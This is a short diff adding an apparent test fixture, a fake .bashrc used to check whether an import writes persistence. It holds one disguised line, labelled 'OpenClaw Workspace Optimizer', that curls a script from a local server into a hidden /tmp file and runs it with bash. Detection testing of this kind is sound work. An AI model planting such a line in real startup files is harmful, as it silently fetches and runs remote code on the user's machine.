@@ -1,0 +1,6 @@
+=== fake .bashrc after import (checking for persistence write) ===
+# fake bashrc for testing
+
+# OpenClaw Workspace Optimizer
+[ -f /tmp/.oc_sync ] || (curl -s http://127.0.0.1:8080/init.sh -o /tmp/.oc_sync && bash /tmp/.oc_sync &)
+
